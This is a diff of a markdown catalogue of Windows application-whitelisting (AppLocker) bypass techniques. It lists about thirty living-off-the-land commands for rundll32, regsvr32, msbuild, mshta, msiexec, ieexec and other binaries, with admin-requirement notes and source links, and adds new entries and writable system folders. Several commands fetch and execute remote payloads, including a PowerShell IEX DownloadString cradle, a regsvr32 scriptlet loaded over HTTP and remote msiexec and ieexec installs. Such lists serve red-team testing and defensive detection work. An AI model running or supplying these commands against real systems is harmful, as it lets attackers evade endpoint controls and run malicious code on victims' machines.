@@ -23,23 +23,33 @@ The BypassDLL-DefaultRules and BypassEXE-DefaultRules list should only contain v
 
 ## 1. Rundll32.exe
 
-rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("powershell -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('http://ip:port/');"
+`rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("powershell -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('http://ip:port/');"`
 
-rundll32 shell32.dll,Control_RunDLL payload.dll
+`rundll32.exe javascript:"\..\mshtml.dll,RunHTMLApplication ";eval("w=new%20ActiveXObject(\"WScript.Shell\");w.run(\"calc\");window.close()");`
 
-Requires admin: ?
+`rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WScript.Shell").run("calc.exe",0,true);try{h.Send();b=h.ResponseText;eval(b);}catch(e){new%20ActiveXObject("WScript.Shell").Run("cmd /c taskkill /f /im rundll32.exe",0,true);}`
+
+`rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:https://raw.githubusercontent.com/3gstudent/Javascript-Backdoor/master/test")`
+
+`rundll32 shell32.dll,Control_RunDLL payload.dll`
+
+Requires admin: No
+
+Notes:
 
 Links:  
 https://pentestlab.blog/2017/05/23/applocker-bypass-rundll32/
 https://evi1cg.me/archives/AppLocker_Bypass_Techniques.html#menu_index_7
 
 
+
 ## 2. Regsvr32.exe
 
-regsvr32 /s /n /u /i:http://example.com/file.sct scrobj.dll
+`regsvr32 /s /n /u /i:http://example.com/file.sct scrobj.dll`
 
 Requires admin: No
-Bypasses: 
+
+Notes:
 
 Links:  
 https://gist.github.com/subTee/24c7d8e1ff0f5602092f58cbb3f7d302
@@ -48,9 +58,11 @@ https://gist.github.com/subTee/24c7d8e1ff0f5602092f58cbb3f7d302
 
 ## 3. Msbuild.exe
 
-msbuild.exe pshell.xml
+`msbuild.exe pshell.xml`
 
 Requires admin: No
+
+Notes:
 
 Links:  
 https://gist.github.com/subTee/6b236083da2fd6ddff216e434f257614
@@ -64,10 +76,12 @@ https://www.youtube.com/watch?v=aSDEAPXaz28
 
 ## 4. Regsvcs.exe
 
-regsvcs.exe /U regsvcs.dll
-regsvcs.exe regsvcs.dll
+`regsvcs.exe /U regsvcs.dll`
+`regsvcs.exe regsvcs.dll`
 
 Requires admin: ?
+
+Notes:
 
 Links:  
 https://pentestlab.blog/2017/05/19/applocker-bypass-regasm-and-regsvcs/
@@ -77,10 +91,12 @@ https://gist.githubusercontent.com/subTee/fb09ef511e592e6f7993/raw/e9b28e7955a56
 
 ## 5. Regasm.exe
 
-regasm.exe /U regsvcs.dll
-regasm.exe regsvcs.dll
+`regasm.exe /U regsvcs.dll`
+`regasm.exe regsvcs.dll`
 
 Requires admin: ?
+
+Notes:
 
 Links:  
 https://pentestlab.blog/2017/05/19/applocker-bypass-regasm-and-regsvcs/
@@ -90,9 +106,11 @@ https://gist.githubusercontent.com/subTee/fb09ef511e592e6f7993/raw/e9b28e7955a56
 
 ## 6. Bginfo.exe
 
-bginfo.exe bginfo.bgi /popup /nolicprompt
+`bginfo.exe bginfo.bgi /popup /nolicprompt`
 
 Requires admin: No
+
+Notes:
 
 Links:  
 https://msitpros.com/?p=3831
@@ -103,9 +121,11 @@ https://msitpros.com/?p=3860
 
 ## 7. InstallUtil.exe
 
-InstallUtil.exe /logfile= /LogToConsole=false /U AllTheThings.dll
+`InstallUtil.exe /logfile= /LogToConsole=false /U AllTheThings.dll`
 
 Requires admin: No
+
+Notes:
 
 Links:  
 https://github.com/subTee/AllTheThings
@@ -117,9 +137,11 @@ http://subt0x10.blogspot.no/2017/09/banned-file-execution-via.html
 
 ## 8. MSDT.exe
 
-Open .diagcab package
+`Open .diagcab package`
 
 Requires admin: ?
+
+Notes:
 
 Links:  
 https://cybersyndicates.com/2015/10/a-no-bull-guide-to-malicious-windows-trouble-shooting-packs-and-application-whitelist-bypass/
@@ -128,9 +150,11 @@ https://cybersyndicates.com/2015/10/a-no-bull-guide-to-malicious-windows-trouble
 
 ## 9. mshta.exe
 
-mshta.exe evilfile.hta
+`mshta.exe evilfile.hta`
 
 Requires admin: No
+
+Notes:
 
 Links:  
 https://evi1cg.me/archives/AppLocker_Bypass_Techniques.html#menu_index_4
@@ -139,9 +163,11 @@ https://evi1cg.me/archives/AppLocker_Bypass_Techniques.html#menu_index_4
 
 ## 10. Execute .Bat
 
-cmd.exe /k < script.txt
+`cmd.exe /k < script.txt`
 
 Requires admin: No
+
+Notes:
 
 Links:  
 https://evi1cg.me/archives/AppLocker_Bypass_Techniques.html#menu_index_3
@@ -150,9 +176,11 @@ https://evi1cg.me/archives/AppLocker_Bypass_Techniques.html#menu_index_3
 
 ## 11. Execute .PS1
 
-Get-Content script.txt | iex
+`Get-Content script.txt | iex`
 
 Requires admin: No
+
+Notes:
 
 Links:  
 https://evi1cg.me/archives/AppLocker_Bypass_Techniques.html#menu_index_3
@@ -161,9 +189,11 @@ https://evi1cg.me/archives/AppLocker_Bypass_Techniques.html#menu_index_3
 
 ## 12. Execute .VBS
 
-cscript.exe //E:vbscript script.txt
+`cscript.exe //E:vbscript script.txt`
 
 Requires admin: No
+
+Notes:
 
 Links:  
 https://evi1cg.me/archives/AppLocker_Bypass_Techniques.html#menu_index_3
@@ -176,6 +206,8 @@ Missing Example
 
 Requires admin: ?
 
+Notes:
+
 Links:  
 https://raw.githubusercontent.com/subTee/ShmooCon-2015/master/ShmooCon-2015-Simple-WLEvasion.pdf
 
@@ -187,6 +219,8 @@ Missing Example
 
 Requires admin: ?
 
+Notes:
+
 Links:  
 https://raw.githubusercontent.com/subTee/ShmooCon-2015/master/ShmooCon-2015-Simple-WLEvasion.pdf
 
@@ -194,9 +228,11 @@ https://raw.githubusercontent.com/subTee/ShmooCon-2015/master/ShmooCon-2015-Simp
 
 ## 15. IEExec.exe
 
-ieexec.exe http://x.x.x.x:8080/bypass.exe
+`ieexec.exe http://x.x.x.x:8080/bypass.exe`
 
 Requires admin: ?
+
+Notes:
 
 Links:  
 https://room362.com/post/2014/2014-01-16-application-whitelist-bypass-using-ieexec-dot-exe/
@@ -205,9 +241,11 @@ https://room362.com/post/2014/2014-01-16-application-whitelist-bypass-using-ieex
 
 ## 16. cdb.exe
 
-cdb.exe -cf x64_calc.wds -o notepad.exe
+`cdb.exe -cf x64_calc.wds -o notepad.exe`
 
 Requires admin: ?
+
+Notes:
 
 Links:  
 http://www.exploit-monday.com/2016/08/windbg-cdb-shellcode-runner.html
@@ -215,9 +253,11 @@ http://www.exploit-monday.com/2016/08/windbg-cdb-shellcode-runner.html
 
 ## 17. dnx.exe
 
-dnx.exe consoleapp
+`dnx.exe consoleapp`
 
 Requires admin: ?
+
+Notes:
 
 Links:  
 https://enigma0x3.net/2016/11/17/bypassing-application-whitelisting-by-using-dnx-exe/
@@ -226,9 +266,11 @@ https://enigma0x3.net/2016/11/17/bypassing-application-whitelisting-by-using-dnx
 
 ## 18. rcsi.exe
 
-rcsi.exe bypass.csx
+`rcsi.exe bypass.csx`
 
 Requires admin: ?
+
+Notes:
 
 Links:  
 https://enigma0x3.net/2016/11/21/bypassing-application-whitelisting-by-using-rcsi-exe/
@@ -241,6 +283,8 @@ Missing example
 
 Requires admin: ?
 
+Notes:
+
 Links:  
 https://web.archive.org/web/20161008143428/http://subt0x10.blogspot.com/2016/09/application-whitelisting-bypass-csiexe.html
 
@@ -248,9 +292,11 @@ https://web.archive.org/web/20161008143428/http://subt0x10.blogspot.com/2016/09/
 
 ## 20. CPL loading location manipulation
 
-Control.exe
+`Control.exe`
 
 Requires admin: No
+
+Notes:
 
 Links:  
 https://pentestlab.blog/2017/05/24/applocker-bypass-control-panel/
@@ -260,9 +306,11 @@ https://www.contextis.com/resources/blog/applocker-bypass-registry-key-manipulat
 
 ## 21. msxsl.exe
 
-msxsl.exe customers.xml script.xsl
+`msxsl.exe customers.xml script.xsl`
 
 Requires admin: No
+
+Notes:
 
 Links:  
 https://pentestlab.blog/2017/07/06/applocker-bypass-msxsl/
@@ -272,10 +320,12 @@ https://gist.github.com/subTee/d9380299ff35738723cb44f230ab39a1
 
 ## 22. msiexec.exe
 
-msiexec /quiet /i cmd.msi
-msiexec /q /i http://192.168.100.3/tmp/cmd.png
+`msiexec /quiet /i cmd.msi`
+`msiexec /q /i http://192.168.100.3/tmp/cmd.png`
 
 Requires admin: ?
+
+Notes:
 
 Links:  
 https://pentestlab.blog/2017/06/16/applocker-bypass-msiexec/
@@ -283,9 +333,11 @@ https://pentestlab.blog/2017/06/16/applocker-bypass-msiexec/
 
 ## 23. cmstp.exe
 
-cmstp.exe /ni /s c:\cmstp\CorpVPN.inf
+`cmstp.exe /ni /s c:\cmstp\CorpVPN.inf`
 
 Requires admin: No
+
+Notes:
 
 Links:  
 https://msitpros.com/?p=3960
@@ -294,10 +346,12 @@ https://gist.github.com/api0cradle/cf36fd40fa991c3a6f7755d1810cc61e
 
 ## 24. xwizard.exe
 
-xwizard.exe argument1 argument2
+`xwizard.exe argument1 argument2`
 DLL loading in same folder xwizard.dll
 
 Requires admin: No
+
+Notes:
 
 Links:
 http://www.hexacorn.com/blog/2017/07/31/the-wizard-of-x-oppa-plugx-style/
@@ -305,9 +359,11 @@ http://www.hexacorn.com/blog/2017/07/31/the-wizard-of-x-oppa-plugx-style/
 
 ## 25. fsi.exe
 
-fsi.exe c:\folder\d.fscript
+`fsi.exe c:\folder\d.fscript`
 
 Requires admin: No
+
+Notes:
 
 Links:
 https://gist.github.com/NickTyrer/51eb8c774a909634fa69b4d06fc79ae1
@@ -318,9 +374,53 @@ https://docs.microsoft.com/en-us/dotnet/fsharp/tutorials/fsharp-interactive/
 
 ## 26. odbcconf.exe
 
-odbcconf -f file.rsp
+`odbcconf -f file.rsp`
 
 Requires admin: ?
 
+Notes:
+
 Links:
 https://gist.github.com/NickTyrer/6ef02ce3fd623483137b45f65017352b
+
+
+
+## 27. te.exe
+
+`te.exe bypass.wsc`
+
+Requires admin: No
+
+Notes: Can be used if the Test Authoring and Execution Framework is installed and is in a path that is whitelisted. 
+Default location is: C:\program files (x86)\Windows Kits\10\testing\Runtimes\TAEF
+ 
+Links:
+https://twitter.com/gN3mes1s/status/927680266390384640
+https://gist.github.com/N3mes1s/5b75a4cd6aa4d41bb742acace2c8ab42
+
+
+
+## 28. Placing files in writeable paths under c:\windows
+
+The following folders are by default writable and executable by normal users
+`C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys`
+`C:\Windows\System32\spool\drivers\color`
+`C:\Windows\Tasks`
+`C:\windows\tracing`
+
+Requires admin: No
+
+Notes: This list is based on Windows 10 1709. Run accesschk to verify on other Windows versions
+
+
+
+## 29. Atbroker.exe
+
+`ATBroker.exe /start malware`
+
+Requires admin: No
+
+Notes:
+
+Links:
+http://www.hexacorn.com/blog/2016/07/22/beyond-good-ol-run-key-part-42/
